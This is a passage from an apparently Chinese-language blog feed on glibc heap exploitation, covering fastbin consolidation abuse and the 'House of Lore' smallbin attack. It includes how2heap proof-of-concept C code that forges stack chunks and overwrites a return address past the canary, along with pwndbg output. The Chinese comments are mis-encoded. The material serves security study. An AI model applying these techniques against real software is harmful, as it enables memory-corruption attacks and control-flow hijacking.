chunk4;</span><br><span class="line">    <span class="type">void</span>* dummies[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1[<span class="number">-1</span>] = <span class="number">0xa1</span>;</span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// è§¦å‘fastbinåˆå¹¶</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk4 &#x3D; malloc(0x1000);åchunk1å¤§å°ä¼šé‡å ç¬¼ç½©chunk2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x602050 â€”â–¸ 0x7ffff7dd1bb8 (main_arena+152) â—‚â€” 0x602050 /* &#x27;P `&#x27; */</span><br><span class="line">0xa0: 0x602000 â€”â–¸ 0x7ffff7dd1c08 (main_arena+232) â—‚â€” 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602050</span></span><br><span class="line">00:0000â”‚   0x602050 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚   0x602058 â—‚â€” 0x51 /* &#x27;Q&#x27; */</span><br><span class="line">02:0010â”‚   0x602060 â€”â–¸ 0x7ffff7dd1bb8 (main_arena+152) â€”â–¸ 0x7ffff7dd1ba8 (main_arena+136) â€”â–¸ 0x7ffff7dd1b98 (main_arena+120) â€”â–¸ 0x7ffff7dd1b88 (main_arena+104) â—‚â€” ...</span><br><span class="line">... â†“</span><br><span class="line">04:0020â”‚   0x602070 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x602000</span></span><br><span class="line">00:0000â”‚   0x602000 â—‚â€” 0x0</span><br><span class="line">01:0008â”‚   0x602008 â—‚â€” 0xa1</span><br><span class="line">02:0010â”‚   0x602010 â€”â–¸ 0x7ffff7dd1c08 (main_arena+232) â€”â–¸ 0x7ffff7dd1bf8 (main_arena+216) â€”â–¸ 0x7ffff7dd1be8 (main_arena+200) â€”â–¸ 0x7ffff7dd1bd8 (main_arena+184) â—‚â€” ...</span><br><span class="line">... â†“</span><br><span class="line">04:0020â”‚   0x602020 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹fd"><a href="#ä¿®æ”¹fd" class="headerlink" title="ä¿®æ”¹fd"></a>ä¿®æ”¹fd</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk1 = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">//0x602000</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>* chunk2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);<span class="comment">//0x602050</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//é˜²æ­¢consolidateæ—¶æŠ¥é”™</span></span><br><span class="line">    chunk2[<span class="number">1</span>] = <span class="number">0x31</span>; <span class="comment">//fake chunk size 0x30</span></span><br><span class="line">    chunk2[<span class="number">7</span>] = <span class="number">0x21</span>;  <span class="comment">//fake chunk&#x27;s next chunk</span></span><br><span class="line">    chunk2[<span class="number">11</span>] = <span class="number">0x21</span>; <span class="comment">//fake chunk&#x27;s next chunk&#x27;s next chuck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = chunk2;<span class="comment">// modify the fd of chunk1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">5000</span>);<span class="comment">// malloc a  big chunk to trigger malloc consolidate</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå°±æ˜¯chunk2è¢«æŒ‚å…¥smallbin</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x30: 0x602070 â€”â–¸ 0x7ffff7dd1b98 (main_arena+120) â—‚â€” 0x602070 /* &#x27;p `&#x27; */</span><br><span class="line">0x60: 0x602000 â€”â–¸ 0x7ffff7dd1bc8 (main_arena+168) â—‚â€” 0x602000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p chunk2</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (unsigned long *) 0x602070</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House of Lore</title>
      <link href="/2023/08/03/House-of-Lore/"/>
      <url>/2023/08/03/House-of-Lore/</url>
      
        <content type="html"><![CDATA[<p>å…³äºsmallbin(FIFO)åˆ©ç”¨æ‰‹æ³• </p><p>åˆ©ç”¨æ¡ä»¶</p><ul><li>èƒ½å¤Ÿæ§åˆ¶small bin chunkçš„bkæŒ‡é’ˆã€‚</li><li>èƒ½å¤Ÿæ§åˆ¶æŒ‡å®šä½ç½®targetçš„fdæŒ‡é’ˆã€‚ä¸€èˆ¬æ¥è®²targetçš„bk å’Œ target bkçš„fdéƒ½èƒ½å¯æ§ï¼Œå› ä¸ºæˆ‘ä»¬ç”³è¯·targetæ—¶ä¹Ÿéœ€è¦ç»•è¿‡ç»™bck-&gt;fd !&#x3D; victimæ£€æµ‹</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// è·å– small bin çš„ç´¢å¼•</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// è·å–å¯¹åº” small bin ä¸­çš„ chunk æŒ‡é’ˆ</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// å…ˆæ‰§è¡Œ victim= last(bin)ï¼Œè·å– small bin çš„æœ€åä¸€ä¸ª chunk</span></span><br><span class="line">        <span class="comment">// å¦‚æœ victim = bin ï¼Œé‚£è¯´æ˜è¯¥ bin ä¸ºç©ºã€‚</span></span><br><span class="line">        <span class="comment">// å¦‚æœä¸ç›¸ç­‰ï¼Œé‚£ä¹ˆä¼šæœ‰ä¸¤ç§æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// ç¬¬ä¸€ç§æƒ…å†µï¼Œsmall bin è¿˜æ²¡æœ‰åˆå§‹åŒ–ã€‚</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// æ‰§è¡Œåˆå§‹åŒ–ï¼Œå°† fast bins ä¸­çš„ chunk è¿›è¡Œåˆå¹¶</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// ç¬¬äºŒç§æƒ…å†µï¼Œsmall bin ä¸­å­˜åœ¨ç©ºé—²çš„ chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// è·å– small bin ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// ä¿®æ”¹ small bin é“¾è¡¨ï¼Œå°† small bin çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// å¦‚æœä¸æ˜¯ main_arenaï¼Œè®¾ç½®å¯¹åº”çš„æ ‡å¿—</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// ç»†è‡´çš„æ£€æŸ¥</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// å°†ç”³è¯·åˆ°çš„ chunk è½¬åŒ–ä¸ºå¯¹åº”çš„ mem çŠ¶æ€</span></span><br><span class="line">                <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// å¦‚æœè®¾ç½®äº† perturb_type , åˆ™å°†è·å–åˆ°çš„chunkåˆå§‹åŒ–ä¸º perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦åˆ©ç”¨çš„å°±æ˜¯ç¬¬äºŒç§æƒ…å†µ</p><h2 id="how2heapä¾‹å­"><a href="#how2heapä¾‹å­" class="headerlink" title="how2heapä¾‹å­"></a>how2heapä¾‹å­</h2><h3 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//å‡è®¾victimçš„bkå¯è¦†ç›–</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  <span class="comment">//ä¼ªé€ çš„å †å—ï¼Œå³victim-&gt;bk=stack_buffer_1 å¯ä»¥ç»•è¿‡bck-&gt;fd=victimçš„æ£€æŸ¥</span></span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  <span class="comment">//è¿™é‡Œå› ä¸ºæˆ‘ä»¬æœ€ç»ˆç”³è¯·stack_buffer_1æ—¶ï¼Œä¹Ÿéœ€è¦æ£€æŸ¥ stack_buffer_1-&gt;bck-&gt;fd=stack_buffer_1</span></span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="comment">//é¿å…é‡Šæ”¾vimtimæ—¶å’Œtopchunkåˆå¹¶</span></span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="comment">//freeåä¼šè¿›å…¥unsortbiné‡Œ</span></span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"><span class="comment">//ç”³è¯·ä¸€ä¸ªunsortbinæ— æ³•å¤„ç†çš„çš„å †å—ï¼Œä½¿unsortbiné‡Œçš„victimè¿›å…¥smallbin</span></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//æ¨¡æ‹Ÿå†™æº¢å‡ºåˆ°victimçš„bkæŒ‡é’ˆ</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"><span class="comment">//ç”³è¯·ä¸€æ¬¡stack_buffer_1ä¼šæ’åˆ°smallbinçš„ä¸‹ä¸€ä¸ªç”³è¯·ç›®æ ‡</span></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="comment">//ç”³è¯·åˆ°stack_buffer_1</span></span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0x168d010</span><br><span class="line">stack_buffer_1 at 0x7ffcb1a6c510</span><br><span class="line">stack_buffer_2 at 0x7ffcb1a6c4f0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0x168d120</span><br><span class="line">Freeing the chunk 0x168d010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16b78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16b78</span></span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x168d010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x168d510</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">fwd: 0x7fec6bd16c78</span></span><br><span class="line"><span class="meta prompt_">victim-&gt;</span><span class="language-bash">bk: 0x7fec6bd16c78</span></span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = malloc(0x100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fec6bd16c78</span><br><span class="line"></span><br><span class="line">p4 is 0x7ffcb1a6c520 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html</a></p><p><strong>__builtin_return_address</strong> è¿”å›å‡½æ•°çš„è¿”å›åœ°å€</p><p><strong>__builtin_frame_address</strong> è¿”å›å½“å‰å‡½æ•°çš„å¸§åœ°å€å³rbpçš„å€¼</p></blockquote><h3 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h3><p>31çš„è¯éœ€è¦ç»•è¿‡tcacheå’Œstashçš„æœºåˆ¶ï¼ŒstashåŸºæœ¬åŸç†å°±æ˜¯å½“è°ƒç”¨ _int_malloc æ—¶ï¼Œå¦‚æœä» smallbin æˆ–è€… fastbin ä¸­å–å‡º chunkä¹‹åï¼Œå¯¹åº”å¤§å°çš„ tcache æ²¡æœ‰æ»¡ï¼Œå°±ä¼šæŠŠå‰©ä¸‹çš„ bin æ”¾å…¥ tcache ä¸­</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span 